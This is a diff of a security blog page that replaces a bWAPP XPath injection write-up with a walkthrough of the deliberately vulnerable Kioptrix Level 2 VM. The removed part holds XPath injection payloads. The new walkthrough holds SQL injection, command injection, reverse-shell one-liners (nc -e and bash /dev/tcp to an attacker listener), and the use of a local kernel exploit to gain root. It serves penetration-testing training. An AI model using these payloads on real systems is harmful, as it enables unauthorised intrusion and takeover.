@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="BWAPP XML/XPath Injection (Login Form/search), CTF, OSCP, Cyber Security, Blockchain">
+    <meta name="keywords" content="Kioptrix-level-2, CTF, OSCP, Cyber Security, Blockchain">
     <meta name="description" content="Mukhilan Pari Personal Blog">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -27,7 +27,7 @@
 </script>
 
 
-    <title>BWAPP XML/XPath Injection (Login Form/search) | Mukhilan</title>
+    <title>Kioptrix-level-2 | Mukhilan</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -324,12 +324,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/writeups/kioptrix/Kioptrix.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">BWAPP XML/XPath Injection (Login Form/search)</h1>
+                    <h1 class="description center-align post-title">Kioptrix-level-2</h1>
                 </div>
             </div>
         </div>
@@ -446,8 +446,20 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Bwapp/">
-                                <span class="chip bg-color">Bwapp</span>
+                            <a href="/tags/OSCP/">
+                                <span class="chip bg-color">OSCP</span>
+                            </a>
+                        
+                            <a href="/tags/Notes/">
+                                <span class="chip bg-color">Notes</span>
+                            </a>
+                        
+                            <a href="/tags/VulnHub/">
+                                <span class="chip bg-color">VulnHub</span>
+                            </a>
+                        
+                            <a href="/tags/Writeups/">
+                                <span class="chip bg-color">Writeups</span>
                             </a>
                         
                     </div>
@@ -471,28 +483,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2019-01-18
+                    2021-06-20
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2021-06-10
+                    2021-06-20
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    349
+                    1.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    2 Min
+                    9 Min
                 </div>
                 
 
@@ -507,44 +519,231 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="BWAPP-A1-Injection"><a href="#BWAPP-A1-Injection" class="headerlink" title="BWAPP A1 - Injection"></a>BWAPP A1 - Injection</h1><h2 id="XML-XPath-Injection-Login-Form"><a href="#XML-XPath-Injection-Login-Form" class="headerlink" title="XML/XPath Injection (Login Form):"></a>XML/XPath Injection (Login Form):</h2><p>Sample xml data is as below,</p>
-<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Employees</span><span class="token punctuation">></span></span>
-   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Employee</span> <span class="token attr-name">ID</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FirstName</span><span class="token punctuation">></span></span>Arnold<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FirstName</span><span class="token punctuation">></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastName</span><span class="token punctuation">></span></span>Baker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastName</span><span class="token punctuation">></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>UserName</span><span class="token punctuation">></span></span>ABaker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>UserName</span><span class="token punctuation">></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Password</span><span class="token punctuation">></span></span>SoSecret<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Password</span><span class="token punctuation">></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Type</span><span class="token punctuation">></span></span>Admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Type</span><span class="token punctuation">></span></span>
-   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Employee</span><span class="token punctuation">></span></span>
-   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Employee</span> <span class="token attr-name">ID</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FirstName</span><span class="token punctuation">></span></span>Peter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FirstName</span><span class="token punctuation">></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LastName</span><span class="token punctuation">></span></span>Pan<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>LastName</span><span class="token punctuation">></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>UserName</span><span class="token punctuation">></span></span>PPan<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>UserName</span><span class="token punctuation">></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Password</span><span class="token punctuation">></span></span>NotTelling<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Password</span><span class="token punctuation">></span></span>
-      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Type</span><span class="token punctuation">></span></span>User<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Type</span><span class="token punctuation">></span></span>
-   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Employee</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Employees</span><span class="token punctuation">></span></span></code></pre>
-<p>The source code is, </p>
-<pre><code>$xml = simplexml_load_file("passwords/heroes.xml");
-$result = $xml-&gt;xpath("/heroes/hero[login='" . $login . "' and password='" . $password . "']");</code></pre>
-<p>To find whether its XML injection or not, its similar to SQL injection. Use single quote <code>'</code> and error shows you XML and XPath is used.</p>
-<h3 id="LOW-LEVEL"><a href="#LOW-LEVEL" class="headerlink" title="LOW LEVEL :"></a>LOW LEVEL :</h3><p>Here without login password validation, Data can be accessed using <strong>id</strong> in the XML as below. </p>
-<p><code>blah' or id='2</code> this payload is getting the user detail of 2nd user. Accordingly, other user data also can be accessed.</p>
-<p>another payload,</p>
-<pre><code>blah' or 1=1 or '</code></pre>
-<h3 id="MEDIUM-LEVEL"><a href="#MEDIUM-LEVEL" class="headerlink" title="MEDIUM LEVEL :"></a>MEDIUM LEVEL :</h3><p>In this, medium level and high level are same.</p>
-<h2 id="XML-XPath-Injection-search"><a href="#XML-XPath-Injection-search" class="headerlink" title="XML/XPath Injection (search):"></a>XML/XPath Injection (search):</h2><p>This injection is more of a blind XML/XPath.</p>
-<h3 id="LOW-LEVEL-1"><a href="#LOW-LEVEL-1" class="headerlink" title="LOW LEVEL :"></a>LOW LEVEL :</h3><p>payload is, </p>
-<pre><code>')]/child::node() | blah[contains(blah,'</code></pre>
-<p>Payload should be in genre field, then updated Url is</p>
-<pre><code>localhost/bwapp/xmli_2.php?genre=%27)]/child::node()%20|%20blah[contains(blah,%27&amp;action=search</code></pre>
-<p>Entity name is unknown. So, <code>child::node()</code> is to select all the node. That’s why it prints all the data.</p>
-<p>The source code is,</p>
-<pre><code>$result = $xml-&gt;xpath("//hero[contains(genre, '$genre')]/movie");</code></pre>
-<h3 id="MEDIUM-LEVEL-1"><a href="#MEDIUM-LEVEL-1" class="headerlink" title="MEDIUM LEVEL :"></a>MEDIUM LEVEL :</h3><p>In this, medium level and high level are same.</p>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><pre><code>https://www.owasp.org/index.php/XPATH_Injection
-https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</code></pre>
+                <h1 id="KIOPTRIX-LEVEL-1-1-2"><a href="#KIOPTRIX-LEVEL-1-1-2" class="headerlink" title="KIOPTRIX LEVEL 1.1 (#2)"></a>KIOPTRIX LEVEL 1.1 (#2)</h1><p>Kioptrix series consists of 5 vulnerable machines. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</p>
+<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><ul>
+<li>-p- –&gt; to scan ports from 1 through 65535</li>
+<li>-sV –&gt; Version detection</li>
+<li>-sC –&gt; script scan using the default set of scripts =&gt; equivalent to –script=default</li>
+<li>-A –&gt; Aggressive scan options</li>
+<li>–min-rate 1000 –&gt; 1000 packets per second</li>
+<li>–max-retries 5 –&gt; number of times a packet is to be resent on a port to check</li>
+</ul>
+<pre class=" language-bash"><code class="language-bash">
+nmap -p- -sV -sC -A --min-rate 1000 --max-retries 5 192.168.1.10
+
+Starting Nmap 7.91 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2021-06-14 14:47 EDT
+Stats: 0:01:53 elapsed<span class="token punctuation">;</span> 0 hosts completed <span class="token punctuation">(</span>1 up<span class="token punctuation">)</span>, 1 undergoing Service Scan
+Service scan Timing: About 85.71% <span class="token keyword">done</span><span class="token punctuation">;</span> ETC: 14:49 <span class="token punctuation">(</span>0:00:17 remaining<span class="token punctuation">)</span>
+Stats: 0:03:15 elapsed<span class="token punctuation">;</span> 0 hosts completed <span class="token punctuation">(</span>1 up<span class="token punctuation">)</span>, 1 undergoing Script Scan
+NSE Timing: About 99.89% <span class="token keyword">done</span><span class="token punctuation">;</span> ETC: 14:50 <span class="token punctuation">(</span>0:00:00 remaining<span class="token punctuation">)</span>
+Nmap scan report <span class="token keyword">for</span> 192.168.1.10
+Host is up <span class="token punctuation">(</span>0.0052s latency<span class="token punctuation">)</span>.
+Not shown: 65528 closed ports
+PORT     STATE SERVICE    VERSION
+22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>        OpenSSH 3.9p1 <span class="token punctuation">(</span>protocol 1.99<span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey: 
+<span class="token operator">|</span>   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 <span class="token punctuation">(</span>RSA1<span class="token punctuation">)</span>
+<span class="token operator">|</span>   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 <span class="token punctuation">(</span>DSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_sshv1: Server supports SSHv1
+80/tcp   <span class="token function">open</span>  http       Apache httpd 2.0.52 <span class="token variable"><span class="token punctuation">((</span>CentOS<span class="token punctuation">))</span></span>
+<span class="token operator">|</span>_http-server-header: Apache/2.0.52 <span class="token punctuation">(</span>CentOS<span class="token punctuation">)</span>
+<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">;</span> charset<span class="token operator">=</span>UTF-8<span class="token punctuation">)</span>.
+111/tcp  <span class="token function">open</span>  rpcbind    2 <span class="token punctuation">(</span>RPC <span class="token comment" spellcheck="true">#100000)</span>
+<span class="token operator">|</span> rpcinfo: 
+<span class="token operator">|</span>   program version    port/proto  <span class="token function">service</span>
+<span class="token operator">|</span>   100000  2            111/tcp   rpcbind
+<span class="token operator">|</span>   100000  2            111/udp   rpcbind
+<span class="token operator">|</span>   100024  1           1010/udp   status
+<span class="token operator">|</span>_  100024  1           1013/tcp   status
+443/tcp  <span class="token function">open</span>  ssl/https?
+<span class="token operator">|</span> ssl-cert: Subject: commonName<span class="token operator">=</span>localhost.localdomain/organizationName<span class="token operator">=</span>SomeOrganization/stateOrProvinceName<span class="token operator">=</span>SomeState/countryName<span class="token operator">=</span>--
+<span class="token operator">|</span> Not valid before: 2009-10-08T00:10:47
+<span class="token operator">|</span>_Not valid after:  2010-10-08T00:10:47
+<span class="token operator">|</span>_ssl-date: 2021-06-14T15:40:58+00:00<span class="token punctuation">;</span> -3h09m28s from scanner time.
+<span class="token operator">|</span> sslv2: 
+<span class="token operator">|</span>   SSLv2 supported
+<span class="token operator">|</span>   ciphers: 
+<span class="token operator">|</span>     SSL2_RC2_128_CBC_WITH_MD5
+<span class="token operator">|</span>     SSL2_RC4_128_EXPORT40_WITH_MD5
+<span class="token operator">|</span>     SSL2_DES_64_CBC_WITH_MD5
+<span class="token operator">|</span>     SSL2_RC4_64_WITH_MD5
+<span class="token operator">|</span>     SSL2_RC4_128_WITH_MD5
+<span class="token operator">|</span>     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+<span class="token operator">|</span>_    SSL2_DES_192_EDE3_CBC_WITH_MD5
+631/tcp  <span class="token function">open</span>  ipp        CUPS 1.1
+<span class="token operator">|</span> http-methods: 
+<span class="token operator">|</span>_  Potentially risky methods: PUT
+<span class="token operator">|</span>_http-server-header: CUPS/1.1
+<span class="token operator">|</span>_http-title: 403 Forbidden
+1013/tcp <span class="token function">open</span>  status     1 <span class="token punctuation">(</span>RPC <span class="token comment" spellcheck="true">#100024)</span>
+3306/tcp <span class="token function">open</span>  mysql?
+<span class="token operator">|</span>_mysql-info: ERROR: Script execution failed <span class="token punctuation">(</span>use -d to debug<span class="token punctuation">)</span>
+<span class="token operator">|</span>_ssl-cert: ERROR: Script execution failed <span class="token punctuation">(</span>use -d to debug<span class="token punctuation">)</span>
+<span class="token operator">|</span>_ssl-date: ERROR: Script execution failed <span class="token punctuation">(</span>use -d to debug<span class="token punctuation">)</span>
+<span class="token operator">|</span>_sslv2: ERROR: Script execution failed <span class="token punctuation">(</span>use -d to debug<span class="token punctuation">)</span>
+<span class="token operator">|</span>_tls-alpn: ERROR: Script execution failed <span class="token punctuation">(</span>use -d to debug<span class="token punctuation">)</span>
+<span class="token operator">|</span>_tls-nextprotoneg: ERROR: Script execution failed <span class="token punctuation">(</span>use -d to debug<span class="token punctuation">)</span>
+
+Host script results:
+<span class="token operator">|</span>_clock-skew: -3h09m28s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>
+Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 222.78 seconds
+</code></pre>
+<h3 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h3><p>To scan web server running on port 80.</p>
+<pre class=" language-bash"><code class="language-bash">
+nikto -h 192.168.1.10
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.10
++ Target Hostname:    192.168.1.10
++ Target Port:        80
++ Start Time:         2021-06-16 14:55:32 <span class="token punctuation">(</span>GMT-4<span class="token punctuation">)</span>
+---------------------------------------------------------------------------
++ Server: Apache/2.0.52 <span class="token punctuation">(</span>CentOS<span class="token punctuation">)</span>
++ Retrieved x-powered-by header: PHP/4.3.9
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="token keyword">in</span> a different fashion to the MIME <span class="token function">type</span>
++ Apache/2.0.52 appears to be outdated <span class="token punctuation">(</span>current is at least Apache/2.4.37<span class="token punctuation">)</span>. Apache 2.2.34 is the EOL <span class="token keyword">for</span> the 2.x branch.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
++ Web Server returns a valid response with junk HTTP methods, this may cause <span class="token boolean">false</span> positives.
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-12184: /?<span class="token operator">=</span>PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?<span class="token operator">=</span>PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?<span class="token operator">=</span>PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ Uncommon header <span class="token string">'tcn'</span> found, with contents: choice
++ OSVDB-3092: /manual/: Web server manual found.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3268: /manual/images/: Directory indexing found.
++ Server may leak inodes via ETags, header found with <span class="token function">file</span> /icons/README, inode: 357810, size: 4872, mtime: Sat Mar 29 13:41:04 1980
++ OSVDB-3233: /icons/README: Apache default <span class="token function">file</span> found.
++ 8725 requests: 1 error<span class="token punctuation">(</span>s<span class="token punctuation">)</span> and 17 item<span class="token punctuation">(</span>s<span class="token punctuation">)</span> reported on remote host
++ End Time:           2021-06-16 14:56:17 <span class="token punctuation">(</span>GMT-4<span class="token punctuation">)</span> <span class="token punctuation">(</span>45 seconds<span class="token punctuation">)</span>
+---------------------------------------------------------------------------
++ 1 host<span class="token punctuation">(</span>s<span class="token punctuation">)</span> tested
+</code></pre>
+<h3 id="services"><a href="#services" class="headerlink" title="services"></a>services</h3><p>Web servers,</p>
+<p>port 443 and 80:<br><img src="/medias/writeups/kioptrix/k2-enum1.png" alt="443 &amp; 80"></p>
+<p>port 631:<br><img src="/medias/writeups/kioptrix/k2-enum2.png" alt="613"></p>
+<p>Mysql,</p>
+<p><img src="/medias/writeups/kioptrix/k2-enum3.png" alt="3306"></p>
+<h2 id="Web-Server"><a href="#Web-Server" class="headerlink" title="Web Server"></a>Web Server</h2><p>Login page found in the port 80, basic SQL injection worked to by pass the login.</p>
+<h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p>Payload in username and password field:  <code>' or 1=1 --</code></p>
+<p><img src="/medias/writeups/kioptrix/k2-webs1.png" alt="payload login page"></p>
+<p>Bypassed home page,<br><img src="/medias/writeups/kioptrix/k2-webs2.png" alt="Bypassed home page"></p>
+<h3 id="Command-injection"><a href="#Command-injection" class="headerlink" title="Command injection"></a>Command injection</h3><p>127.1 is 127.0.0.1, will open a new page <code>/pingit.php</code> and provide output for that IP.</p>
+<p>To concatenate bash commands, <code>;</code> , <code>&amp;&amp;</code> can be used.</p>
+<p>Source code of the index and pingit page,</p>
+<p>From this, database used is <code>webapp</code>.</p>
+<p><img src="/medias/writeups/kioptrix/k2-cmdinj3.png" alt="payload"></p>
+<pre><code>127.1 &amp;&amp; ls &amp;&amp; cat index.php &amp;&amp; cat pingit.php
+
+PING 127.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.000 ms
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.034 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.025 ms
+
+--- 127.1 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2009ms
+rtt min/avg/max/mdev = 0.000/0.019/0.034/0.015 ms, pipe 2
+index.php
+pingit.php
+";
+    mysql_select_db("webapp");
+
+    if ($_POST['uname'] != ""){
+        $username = $_POST['uname'];
+        $password = $_POST['psw'];
+        $query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
+        //print $query."
+";
+        $result = mysql_query($query);
+
+        $row = mysql_fetch_array($result);
+        //print "ID: ".$row['id']."
+";
+    }
+
+?&gt;
+
+Remote System Administration Login
+Username     
+Password     
+
+
+Welcome to the Basic Administrative Web Console
+Ping a Machine on the Network:     
+
+
+';
+        echo shell_exec( 'ping -c 3 ' . $target );
+        echo '
+
+'; } ?&gt; </code></pre>
+<p><code>nc</code> is not in the victim server. so, <code>nc</code> reverse shell didn’t work.</p>
+<blockquote>
+<p>127.1 &amp;&amp; nc -nv 192.168.1.6 4444 -e /bin/sh</p>
+</blockquote>
+<p><img src="/medias/writeups/kioptrix/k2-cmdinj1.png" alt="payload"></p>
+<p><img src="/medias/writeups/kioptrix/k2-cmdinj2.png" alt="payload output"></p>
+<p>Reverse shell cheat sheet : <a target="_blank" rel="noopener" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
+<p>Below reverse shell using bash worked,</p>
+<blockquote>
+<p>127.1 &amp;&amp; bash -i &gt;&amp; /dev/tcp/192.168.1.6/4444 0&gt;&amp;1</p>
+</blockquote>
+<pre class=" language-bash"><code class="language-bash">nc -nvlp 4444                                                        1 ⨯
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> 4444 <span class="token punctuation">..</span>.
+connect to <span class="token punctuation">[</span>192.168.1.6<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span>192.168.1.10<span class="token punctuation">]</span> 32770
+bash: no job control <span class="token keyword">in</span> this shell
+bash-3.00$ <span class="token function">whoami</span>
+apache
+bash-3.00$ <span class="token function">uname</span> -a
+Linux kioptrix.level2 2.6.9-55.EL <span class="token comment" spellcheck="true">#1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux</span>
+bash-3.00$ <span class="token function">id</span>
+uid<span class="token operator">=</span>48<span class="token punctuation">(</span>apache<span class="token punctuation">)</span> gid<span class="token operator">=</span>48<span class="token punctuation">(</span>apache<span class="token punctuation">)</span> groups<span class="token operator">=</span>48<span class="token punctuation">(</span>apache<span class="token punctuation">)</span>
+bash-3.00$ <span class="token function">cat</span> /etc/*-release    
+CentOS release 4.5 <span class="token punctuation">(</span>Final<span class="token punctuation">)</span>
+bash-3.00$ 
+</code></pre>
+<p>Got Normal User(apache) shell.</p>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Linpeas"><a href="#Linpeas" class="headerlink" title="Linpeas"></a>Linpeas</h3><p><a target="_blank" rel="noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">Linpeas</a> can be used to enumerate,</p>
+<p>Server created in host,</p>
+<blockquote>
+<p>sudo python -m SimpleHTTPServer 80</p>
+</blockquote>
+<p>Only <code>/tmp</code> directory has write access, downloaded linpeas file in victim using wget. </p>
+<blockquote>
+<p>wget 192.168.1.6/linpeas.sh</p>
+</blockquote>
+<p>By executing linpeas, operative system output with linux version <code>2.6.9</code> as red which needs attention. </p>
+<pre class=" language-bash"><code class="language-bash">Linux version 2.6.9-55.EL <span class="token punctuation">(</span>mockbuild@builder6.centos.org<span class="token punctuation">)</span> <span class="token punctuation">(</span>gcc version 3.4.6 20060404 <span class="token punctuation">(</span>Red Hat 3.4.6-8<span class="token punctuation">))</span> <span class="token comment" spellcheck="true">#1 Wed May 2 13:52:16 EDT 2007</span>
+LSB Version:    :core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch
+Distributor ID: CentOS
+Description:    CentOS release 4.5 <span class="token punctuation">(</span>Final<span class="token punctuation">)</span>
+Release:        4.5
+Codename:       Final
+</code></pre>
+<h3 id="Searchsploit"><a href="#Searchsploit" class="headerlink" title="Searchsploit"></a>Searchsploit</h3><pre class=" language-bash"><code class="language-bash">$ searchsploit linux 2.6.9 centos
+------------------------------------------- ---------------------------------
+ Exploit Title                             <span class="token operator">|</span>  Path
+------------------------------------------- ---------------------------------
+Linux Kernel 2.6 <span class="token operator">&lt;</span> 2.6.19 <span class="token punctuation">(</span>White Box 4 / C <span class="token operator">|</span> linux_x86/local/9542.c
+------------------------------------------- ---------------------------------
+Shellcodes: No Results</code></pre>
+<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p>Downloaded <code>9542.c</code> file from host.</p>
+<pre class=" language-bash"><code class="language-bash">bash-3.00$ gcc 9542.c -o 9542 
+9542.c:109:28: warning: no newline at end of <span class="token function">file</span>
+bash-3.00$ ./9542       
+sh: no job control <span class="token keyword">in</span> this shell
+sh-3.00<span class="token comment" spellcheck="true"># id</span>
+uid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span> gid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span> groups<span class="token operator">=</span>48<span class="token punctuation">(</span>apache<span class="token punctuation">)</span>
+sh-3.00<span class="token comment" spellcheck="true"># </span></code></pre>
+<p>Got root shell.</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">https://www.vulnhub.com/entry/kioptrix-level-11-2,23/</a></p>
+<p><a target="_blank" rel="noopener" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -588,7 +787,7 @@ https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://mukhilan.com/Writeups/bwapp-xml-xpath/">http://mukhilan.com/Writeups/bwapp-xml-xpath/</a>
+                    <a href="http://mukhilan.com/Writeups/Kioptrix-level-2/">http://mukhilan.com/Writeups/Kioptrix-level-2/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -626,8 +825,20 @@ https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</code></pre>
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Bwapp/">
-                                    <span class="chip bg-color">Bwapp</span>
+                                <a href="/tags/OSCP/">
+                                    <span class="chip bg-color">OSCP</span>
+                                </a>
+                            
+                                <a href="/tags/Notes/">
+                                    <span class="chip bg-color">Notes</span>
+                                </a>
+                            
+                                <a href="/tags/VulnHub/">
+                                    <span class="chip bg-color">VulnHub</span>
+                                </a>
+                            
+                                <a href="/tags/Writeups/">
+                                    <span class="chip bg-color">Writeups</span>
                                 </a>
                             
                         </div>
@@ -672,7 +883,7 @@ https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</code></pre>
         repo: 'mukhilanpari.github.io',
         owner: 'mukhilanpari',
         admin: "mukhilanpari",
-        id: '2019-01-18T00-00-00',
+        id: '2021-06-20T23-21-43',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -696,77 +907,28 @@ https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/Writeups/bwapp-html/">
+                <a href="/Writeups/Kioptrix-level-2/">
                     <div class="card-image">
                         
+                        <img src="/medias/writeups/kioptrix/Kioptrix.png" class="responsive-img" alt="Kioptrix-level-2">
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="BWAPP HTML Injection (GET/POST)">
-                        
-                        <span class="card-title">BWAPP HTML Injection (GET/POST)</span>
+                        <span class="card-title">Kioptrix-level-2</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            BWAPP HTML Injection GET/POST solution
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2019-01-18
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/Writeups/" class="post-category">
-                                    Writeups
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Bwapp/">
-                        <span class="chip bg-color">Bwapp</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Current&nbsp;<i class="far fa-dot-circle"></i>
-            </div>
-            <div class="card">
-                <a href="/Writeups/bwapp-xml-xpath/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="BWAPP XML/XPath Injection (Login Form/search)">
-                        
-                        <span class="card-title">BWAPP XML/XPath Injection (Login Form/search)</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            BWAPP XML/XPath Injection Login Form and search solution
